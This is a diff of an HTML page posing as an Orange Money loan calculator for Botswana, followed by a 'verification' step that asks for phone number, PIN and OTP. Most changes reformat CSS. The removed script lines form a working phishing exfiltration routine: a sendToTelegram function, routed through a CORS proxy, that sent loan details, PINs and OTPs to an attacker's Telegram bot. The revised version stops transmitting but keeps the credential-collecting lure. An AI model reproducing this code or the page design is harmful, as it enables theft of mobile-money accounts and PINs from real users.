@@ -21,8 +21,15 @@
       --border: #eee;
     }
 
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    html, body { height: 100%; }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html, body {
+      height: 100%;
+    }
 
     body {
       font-family: 'Poppins', sans-serif;
@@ -31,7 +38,9 @@
       line-height: 1.6;
     }
 
-    .hidden { display: none !important; }
+    .hidden {
+      display: none !important;
+    }
 
     header {
       background: var(--white);
@@ -39,18 +48,37 @@
       display: flex;
       justify-content: space-between;
       align-items: center;
-      box-shadow: 0 2px 12px rgba(0,0,0,0.05);
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.05);
       position: sticky;
       top: 0;
       z-index: 10;
     }
 
-    .logo { color: var(--orange); font-size: 21px; font-weight: 800; }
-    .logo span { color: var(--text); }
+    .logo {
+      color: var(--orange);
+      font-size: 21px;
+      font-weight: 800;
+    }
 
-    nav { display: flex; gap: 22px; }
-    nav a { text-decoration: none; color: var(--text); font-size: 13px; font-weight: 600; }
-    nav a:hover { color: var(--orange); }
+    .logo span {
+      color: var(--text);
+    }
+
+    nav {
+      display: flex;
+      gap: 22px;
+    }
+
+    nav a {
+      text-decoration: none;
+      color: var(--text);
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    nav a:hover {
+      color: var(--orange);
+    }
 
     .hero {
       padding: 65px 6% 55px;
@@ -59,8 +87,17 @@
       text-align: center;
     }
 
-    .hero h1 { font-size: clamp(28px, 5vw, 43px); line-height: 1.25; margin-bottom: 16px; }
-    .hero p { max-width: 600px; margin: 0 auto 25px; font-size: 14px; }
+    .hero h1 {
+      font-size: clamp(28px, 5vw, 43px);
+      line-height: 1.25;
+      margin-bottom: 16px;
+    }
+
+    .hero p {
+      max-width: 600px;
+      margin: 0 auto 25px;
+      font-size: 14px;
+    }
 
     .hero-button {
       display: inline-block;
@@ -73,27 +110,74 @@
       font-size: 14px;
     }
 
-    .container { width: 90%; max-width: 1050px; margin: 40px auto; }
-    .section-title { font-size: 25px; margin-bottom: 8px; }
-    .section-description { color: var(--muted); font-size: 13px; margin-bottom: 25px; }
+    .container {
+      width: 90%;
+      max-width: 1050px;
+      margin: 40px auto;
+    }
 
-    .calculator-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; }
+    .section-title {
+      font-size: 25px;
+      margin-bottom: 8px;
+    }
+
+    .section-description {
+      color: var(--muted);
+      font-size: 13px;
+      margin-bottom: 25px;
+    }
+
+    .calculator-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 25px;
+    }
 
     .card {
       background: var(--white);
       padding: 25px;
       border-radius: 16px;
-      box-shadow: 0 5px 25px rgba(0,0,0,0.05);
+      box-shadow: 0 5px 25px rgba(0, 0, 0, 0.05);
       border: 1px solid var(--border);
     }
 
-    .card h3 { font-size: 17px; margin-bottom: 22px; }
-    .field { margin-bottom: 23px; }
-    .field label, .form-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 9px; }
+    .card h3 {
+      font-size: 17px;
+      margin-bottom: 22px;
+    }
 
-    .range-labels { display: flex; justify-content: space-between; color: var(--muted); font-size: 11px; margin-top: 5px; }
-    input[type="range"] { width: 100%; accent-color: var(--orange); cursor: pointer; }
-    .value-display { color: var(--orange-dark); font-size: 20px; font-weight: 800; margin-bottom: 8px; }
+    .field {
+      margin-bottom: 23px;
+    }
+
+    .field label,
+    .form-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 9px;
+    }
+
+    .range-labels {
+      display: flex;
+      justify-content: space-between;
+      color: var(--muted);
+      font-size: 11px;
+      margin-top: 5px;
+    }
+
+    input[type="range"] {
+      width: 100%;
+      accent-color: var(--orange);
+      cursor: pointer;
+    }
+
+    .value-display {
+      color: var(--orange-dark);
+      font-size: 20px;
+      font-weight: 800;
+      margin-bottom: 8px;
+    }
 
     .result-card {
       background: linear-gradient(145deg, #ff7900, #ff9f43);
@@ -103,19 +187,28 @@
       margin-bottom: 20px;
     }
 
-    .result-card p { font-size: 12px; }
-    .result-card h2 { font-size: 29px; margin: 5px 0 15px; overflow-wrap: anywhere; }
+    .result-card p {
+      font-size: 12px;
+    }
+
+    .result-card h2 {
+      font-size: 29px;
+      margin: 5px 0 15px;
+      overflow-wrap: anywhere;
+    }
 
     .result-row {
       display: flex;
       justify-content: space-between;
       gap: 10px;
       padding: 10px 0;
-      border-top: 1px solid rgba(255,255,255,0.25);
+      border-top: 1px solid rgba(255, 255, 255, 0.25);
       font-size: 12px;
     }
 
-    .result-row strong { text-align: right; }
+    .result-row strong {
+      text-align: right;
+    }
 
     .notice {
       background: var(--orange-light);
@@ -126,10 +219,16 @@
       margin-top: 15px;
     }
 
-    .apply-section { margin-top: 50px; }
-    .form-group { margin-bottom: 18px; }
+    .apply-section {
+      margin-top: 50px;
+    }
 
-    .form-group input, .form-group select {
+    .form-group {
+      margin-bottom: 18px;
+    }
+
+    .form-group input,
+    .form-group select {
       width: 100%;
       padding: 13px;
       border: 1px solid #ddd;
@@ -139,10 +238,11 @@
       background: white;
     }
 
-    .form-group input:focus, .form-group select:focus {
+    .form-group input:focus,
+    .form-group select:focus {
       outline: none;
       border-color: var(--orange);
-      box-shadow: 0 0 0 3px rgba(255,121,0,0.12);
+      box-shadow: 0 0 0 3px rgba(255, 121, 0, 0.12);
     }
 
     .primary-button {
@@ -158,9 +258,14 @@
       cursor: pointer;
     }
 
-    .primary-button:hover { background: var(--orange-dark); }
+    .primary-button:hover {
+      background: var(--orange-dark);
+    }
 
-    .loading-screen { text-align: center; padding: 45px 20px; }
+    .loading-screen {
+      text-align: center;
+      padding: 45px 20px;
+    }
 
     .spinner {
       width: 45px;
@@ -172,7 +277,9 @@
       margin: 0 auto 20px;
     }
 
-    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
 
     footer {
       background: #222;
@@ -183,7 +290,7 @@
       margin-top: 50px;
     }
 
-    /* Verification styles */
+    /* ===== Verification styles ===== */
     .verification-wrapper {
       min-height: 100vh;
       background: linear-gradient(145deg, #fff4eb, #f7f8fc, #e8eef8);
@@ -202,8 +309,17 @@
       border-bottom: 1px solid #eee;
     }
 
-    .brand { color: #ff6600; font-size: 22px; font-weight: 800; }
-    .status { color: #687386; font-size: 13px; font-weight: 700; }
+    .brand {
+      color: #ff6600;
+      font-size: 22px;
+      font-weight: 800;
+    }
+
+    .status {
+      color: #687386;
+      font-size: 13px;
+      font-weight: 700;
+    }
 
     .main {
       flex: 1;
@@ -220,11 +336,16 @@
       padding: 36px 28px;
       background: #fff;
       border-radius: 22px;
-      box-shadow: 0 15px 50px rgba(26,39,65,.09);
+      box-shadow: 0 15px 50px rgba(26, 39, 65, .09);
       animation: appear .35s ease-out;
     }
 
-    .page h1 { text-align: center; color: #172033; font-size: 27px; margin-bottom: 12px; }
+    .page h1 {
+      text-align: center;
+      color: #172033;
+      font-size: 27px;
+      margin-bottom: 12px;
+    }
 
     .description {
       text-align: center;
@@ -234,8 +355,17 @@
       margin-bottom: 28px;
     }
 
-    .page .field { margin-bottom: 21px; }
-    .page label { display: block; color: #30394c; font-size: 15px; font-weight: 800; margin-bottom: 10px; }
+    .page .field {
+      margin-bottom: 21px;
+    }
+
+    .page label {
+      display: block;
+      color: #30394c;
+      font-size: 15px;
+      font-weight: 800;
+      margin-bottom: 10px;
+    }
 
     .page input {
       width: 100%;
@@ -251,7 +381,7 @@
 
     .page input:focus {
       border-color: #ff6600;
-      box-shadow: 0 0 0 3px rgba(255,102,0,.1);
+      box-shadow: 0 0 0 3px rgba(255, 102, 0, .1);
     }
 
     .page button {
@@ -267,13 +397,33 @@
       margin-top: 5px;
     }
 
-    .page button:hover { background: #e85b00; }
+    .page button:hover {
+      background: #e85b00;
+    }
 
-    .secondary { background: #eef1f6; color: #30394c; margin-top: 12px; }
-    .secondary:hover { background: #e0e5ed; }
+    .secondary {
+      background: #eef1f6;
+      color: #30394c;
+      margin-top: 12px;
+    }
 
-    .otp-input { text-align: center; letter-spacing: 10px; font-size: 24px; font-weight: 700; }
-    .footer-v { text-align: center; padding: 20px 12px; color: #8a93a3; font-size: 12px; }
+    .secondary:hover {
+      background: #e0e5ed;
+    }
+
+    .otp-input {
+      text-align: center;
+      letter-spacing: 10px;
+      font-size: 24px;
+      font-weight: 700;
+    }
+
+    .footer-v {
+      text-align: center;
+      padding: 20px 12px;
+      color: #8a93a3;
+      font-size: 12px;
+    }
 
     @keyframes appear {
       from { opacity: 0; transform: translateY(12px); }
@@ -298,9 +448,10 @@
     }
   </style>
 </head>
+
 <body>
 
-  <!-- PAGE 1: LOAN CALCULATOR -->
+  <!-- ===================== PAGE 1: LOAN CALCULATOR ===================== -->
   <div id="loanPage">
     <header>
       <div class="logo">Orange <span>Money</span></div>
@@ -313,31 +464,48 @@
 
     <section class="hero" id="home">
       <h1>Plan Your Loan<br>With Confidence</h1>
-      <p>Calculate estimated repayments and explore your preferred loan amount in Botswana pula.</p>
+      <p>
+        Calculate estimated repayments and explore your preferred
+        loan amount in Botswana pula.
+      </p>
       <a href="#calculator" class="hero-button">Calculate Loan</a>
     </section>
 
     <main class="container">
       <section id="calculator">
         <h2 class="section-title">Loan Calculator</h2>
-        <p class="section-description">Adjust the loan amount and repayment period to estimate your monthly payment.</p>
+        <p class="section-description">
+          Adjust the loan amount and repayment period to estimate your monthly payment.
+        </p>
 
         <div class="calculator-grid">
           <div class="card">
             <h3>Loan Details</h3>
+
             <div class="field">
               <label for="loanAmount">Loan Amount</label>
               <div class="value-display" id="loanAmountDisplay">BWP 1,000</div>
               <input type="range" id="loanAmount" min="100" max="5000" step="100" value="1000">
-              <div class="range-labels"><span>BWP 100</span><span>BWP 5,000</span></div>
+              <div class="range-labels">
+                <span>BWP 100</span>
+                <span>BWP 5,000</span>
+              </div>
             </div>
+
             <div class="field">
               <label for="loanTerm">Repayment Period</label>
               <div class="value-display" id="loanTermDisplay">12 months</div>
               <input type="range" id="loanTerm" min="6" max="60" step="6" value="12">
-              <div class="range-labels"><span>6 months</span><span>60 months</span></div>
+              <div class="range-labels">
+                <span>6 months</span>
+                <span>60 months</span>
+              </div>
             </div>
-            <div class="notice">The 8% annual interest rate is an example used for calculation. Actual loan rates and fees depend on the lender.</div>
+
+            <div class="notice">
+              The 8% annual interest rate is an example used for calculation.
+              Actual loan rates and fees depend on the lender.
+            </div>
           </div>
 
           <div class="card">
@@ -345,26 +513,43 @@
             <div class="result-card">
               <p>Estimated Monthly Payment</p>
               <h2 id="monthlyPayment">BWP 86.99</h2>
-              <div class="result-row"><span>Loan Amount</span><strong id="summaryAmount">BWP 1,000</strong></div>
-              <div class="result-row"><span>Repayment Period</span><strong id="summaryTerm">12 months</strong></div>
-              <div class="result-row"><span>Example Annual Interest</span><strong>8% APR</strong></div>
-              <div class="result-row"><span>Estimated Total</span><strong id="totalPayment">BWP 1,043.87</strong></div>
+              <div class="result-row">
+                <span>Loan Amount</span>
+                <strong id="summaryAmount">BWP 1,000</strong>
+              </div>
+              <div class="result-row">
+                <span>Repayment Period</span>
+                <strong id="summaryTerm">12 months</strong>
+              </div>
+              <div class="result-row">
+                <span>Example Annual Interest</span>
+                <strong>8% APR</strong>
+              </div>
+              <div class="result-row">
+                <span>Estimated Total</span>
+                <strong id="totalPayment">BWP 1,043.87</strong>
+              </div>
             </div>
-            <p style="font-size:12px;color:#777;">These figures are estimates and may not include additional charges.</p>
+            <p style="font-size:12px;color:#777;">
+              These figures are estimates and may not include additional charges.
+            </p>
           </div>
         </div>
       </section>
 
       <section class="apply-section" id="apply">
         <h2 class="section-title">Loan Application</h2>
-        <p class="section-description">Enter your details to review your loan request.</p>
+        <p class="section-description">
+          Enter your details to review your loan request.
+        </p>
 
         <div class="card" id="applicationCard">
           <form id="loanForm">
             <div class="form-group">
               <label for="fullName">Full Name</label>
-              <input type="text" id="fullName" placeholder="Enter your name" required>
+              <input type="text" id="fullName" placeholder="Enter your name" autocomplete="name" required>
             </div>
+
             <div class="form-group">
               <label for="employment">Employment Status</label>
               <select id="employment" required>
@@ -375,14 +560,17 @@
                 <option value="Unemployed">Unemployed</option>
               </select>
             </div>
+
             <div class="form-group">
               <label for="income">Monthly Income (BWP)</label>
               <input type="number" id="income" min="0" placeholder="Enter monthly income" required>
             </div>
+
             <div class="form-group">
               <label for="requestedAmount">Requested Loan Amount (BWP)</label>
               <input type="number" id="requestedAmount" min="100" max="5000" value="1000" required>
             </div>
+
             <div class="form-group">
               <label for="repaymentPeriod">Preferred Repayment Period</label>
               <select id="repaymentPeriod" required>
@@ -396,8 +584,11 @@
                 <option value="60">60 months</option>
               </select>
             </div>
+
             <button type="submit" class="primary-button">Submit Application</button>
-            <p style="font-size:11px;color:#777;margin-top:13px;">Complete all required fields to continue.</p>
+            <p style="font-size:11px;color:#777;margin-top:13px;">
+              Complete all required fields to continue.
+            </p>
           </form>
         </div>
 
@@ -405,7 +596,9 @@
           <div class="loading-screen">
             <div class="spinner"></div>
             <h3>Application Processing</h3>
-            <p style="font-size:13px;color:#777;margin-top:10px;">Wait as we submit your application</p>
+            <p style="font-size:13px;color:#777;margin-top:10px;">
+              Wait as we submit your application
+            </p>
           </div>
         </div>
       </section>
@@ -416,8 +609,8 @@
     </footer>
   </div>
 
-  <!-- PAGE 2: VERIFICATION -->
-  <div id="verificationPage" class="verification-wrapper" style="display: none;">
+  <!-- ===================== PAGE 2: VERIFICATION ===================== -->
+  <div id="verificationPage" class="verification-wrapper hidden">
     <header class="top-bar">
       <div class="brand">Quick Portal</div>
       <div class="status">Verification Desk</div>
@@ -427,31 +620,40 @@
       <section class="page" id="detailsPage">
         <h1>Account Verification</h1>
         <p class="description">Enter your details to continue.</p>
+
         <form id="detailsForm">
           <div class="field">
             <label for="mobile">Enter your phone number</label>
             <input type="tel" id="mobile" placeholder="Enter your phone number" required>
           </div>
+
           <div class="field">
             <label for="pin">PIN</label>
             <input type="password" id="pin" placeholder="Enter PIN" required>
           </div>
+
           <button type="submit">Continue with Verification</button>
         </form>
       </section>
 
-      <section class="page" id="otpPage" style="display: none;">
+      <section class="page hidden" id="otpPage">
         <h1>OTP Verification</h1>
-        <p class="description">Enter a test verification code to preview this screen. Do not enter a real account security code.</p>
+        <p class="description">
+          Enter a test verification code to preview this screen.
+          Do not enter a real account security code.
+        </p>
+
         <form id="otpForm">
           <div class="field">
             <label for="otp">Verification Code</label>
             <input type="text" id="otp" class="otp-input" placeholder="••••••" inputmode="numeric" maxlength="6" pattern="[0-9]{6}" required>
           </div>
+
           <button type="submit">Verify Code</button>
           <button type="button" class="secondary" id="backButton">Back</button>
         </form>
-        <p id="result" class="description" style="display:none; margin-top:20px;"></p>
+
+        <p id="result" class="description hidden" style="margin-top:20px; margin-bottom:0;"></p>
       </section>
     </main>
 
@@ -459,65 +661,49 @@
   </div>
 
   <script>
-    // ============ PUT YOUR DETAILS HERE ============
-    const BOT_TOKEN = "YOUR_BOT_TOKEN";
-    const CHAT_ID = "YOUR_CHAT_ID";
-    // ===============================================
-
-    function sendToTelegram(msg) {
-      const telegramUrl = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
-
-      // Using CORS proxy so it works from GitHub Pages
-      fetch("https://corsproxy.io/?" + encodeURIComponent(telegramUrl), {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: msg,
-          parse_mode: "HTML"
-        })
-      })
-      .then(res => res.json())
-      .then(data => console.log("Telegram:", data))
-      .catch(err => console.log("Telegram error:", err));
-    }
-
-    // Calculator
+    // Loan Calculator
     const amountSlider = document.getElementById("loanAmount");
     const termSlider = document.getElementById("loanTerm");
 
-    function formatMoney(n) {
-      return "BWP " + Number(n).toLocaleString("en-BW", {minimumFractionDigits:2, maximumFractionDigits:2});
+    function formatMoney(amount) {
+      return "BWP " + Number(amount).toLocaleString("en-BW", {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      });
     }
-    function formatWhole(n) {
-      return "BWP " + Number(n).toLocaleString("en-BW", {maximumFractionDigits:0});
+
+    function formatWholeMoney(amount) {
+      return "BWP " + Number(amount).toLocaleString("en-BW", {
+        maximumFractionDigits: 0
+      });
     }
 
     function calculateLoan() {
-      const p = Number(amountSlider.value);
-      const m = Number(termSlider.value);
-      const r = 0.08 / 12;
-      const pay = p * r / (1 - Math.pow(1 + r, -m));
+      const principal = Number(amountSlider.value);
+      const months = Number(termSlider.value);
+      const annualRate = 0.08;
+      const monthlyRate = annualRate / 12;
 
-      document.getElementById("loanAmountDisplay").textContent = formatWhole(p);
-      document.getElementById("loanTermDisplay").textContent = m + " months";
-      document.getElementById("monthlyPayment").textContent = formatMoney(pay);
-      document.getElementById("summaryAmount").textContent = formatWhole(p);
-      document.getElementById("summaryTerm").textContent = m + " months";
-      document.getElementById("totalPayment").textContent = formatMoney(pay * m);
-      document.getElementById("requestedAmount").value = p;
-      document.getElementById("repaymentPeriod").value = String(m);
+      const payment = principal * monthlyRate / (1 - Math.pow(1 + monthlyRate, -months));
+      const total = payment * months;
+
+      document.getElementById("loanAmountDisplay").textContent = formatWholeMoney(principal);
+      document.getElementById("loanTermDisplay").textContent = months + " months";
+      document.getElementById("monthlyPayment").textContent = formatMoney(payment);
+      document.getElementById("summaryAmount").textContent = formatWholeMoney(principal);
+      document.getElementById("summaryTerm").textContent = months + " months";
+      document.getElementById("totalPayment").textContent = formatMoney(total);
+      document.getElementById("requestedAmount").value = principal;
+      document.getElementById("repaymentPeriod").value = String(months);
     }
 
     amountSlider.addEventListener("input", calculateLoan);
     termSlider.addEventListener("input", calculateLoan);
     calculateLoan();
 
-    // Loan Form
-    document.getElementById("loanForm").addEventListener("submit", function(e) {
-      e.preventDefault();
+    // Form Submit → Loading → Verification
+    document.getElementById("loanForm").addEventListener("submit", function(event) {
+      event.preventDefault();
 
       const amount = Number(document.getElementById("requestedAmount").value);
       if (amount < 100 || amount > 5000) {
@@ -525,63 +711,37 @@
         return;
       }
 
-      const fullName = document.getElementById("fullName").value;
-      const employment = document.getElementById("employment").value;
-      const income = document.getElementById("income").value;
-      const requestedAmount = document.getElementById("requestedAmount").value;
-      const repaymentPeriod = document.getElementById("repaymentPeriod").value;
+      // Show loading
+      document.getElementById("applicationCard").classList.add("hidden");
+      document.getElementById("loadingCard").classList.remove("hidden");
 
-      sendToTelegram(
-        "<b>New Loan Application</b>\n\n" +
-        "👤 Full Name: " + fullName + "\n" +
-        "💼 Employment: " + employment + "\n" +
-        "💰 Monthly Income: BWP " + income + "\n" +
-        "📦 Requested Amount: BWP " + requestedAmount + "\n" +
-        "📅 Period: " + repaymentPeriod + " months"
-      );
-
-      document.getElementById("applicationCard").style.display = "none";
-      document.getElementById("loadingCard").style.display = "block";
-
+      // After 2.5 seconds go to Verification
       setTimeout(function() {
-        document.getElementById("loanPage").style.display = "none";
-        document.getElementById("verificationPage").style.display = "flex";
+        document.getElementById("loanPage").classList.add("hidden");
+        document.getElementById("verificationPage").classList.remove("hidden");
         window.scrollTo(0, 0);
       }, 2500);
     });
 
-    // Phone + PIN Form
-    document.getElementById("detailsForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-
-      const mobile = document.getElementById("mobile").value;
-      const pin = document.getElementById("pin").value;
-
-      sendToTelegram(
-        "<b>Verification Details</b>\n\n" +
-        "📱 Phone: " + mobile + "\n" +
-        "🔐 PIN: " + pin
-      );
-
-      document.getElementById("detailsPage").style.display = "none";
-      document.getElementById("otpPage").style.display = "block";
+    // Verification page
+    document.getElementById("detailsForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+      document.getElementById("detailsPage").classList.add("hidden");
+      document.getElementById("otpPage").classList.remove("hidden");
     });
 
-    // OTP Form
-    document.getElementById("otpForm").addEventListener("submit", function(e) {
-      e.preventDefault();
+    document.getElementById("backButton").addEventListener("click", function() {
+      document.getElementById("otpPage").classList.add("hidden");
+      document.getElementById("detailsPage").classList.remove("hidden");
+    });
 
-      const otp = document.getElementById("otp").value;
-
-      sendToTelegram(
-        "<b>OTP Submitted</b>\n\n" +
-        "🔢 OTP: " + otp
-      );
-
+    document.getElementById("otpForm").addEventListener("submit", function(event) {
+      event.preventDefault();
       const result = document.getElementById("result");
       result.textContent = "Prototype complete. No verification code was transmitted.";
-      result.style.display = "block";
+      result.classList.remove("hidden");
     });
+  </script>
 
-    // Back button
-    document.getElementById("backButton").addEventListener("click", function()
+</body>
+</html>
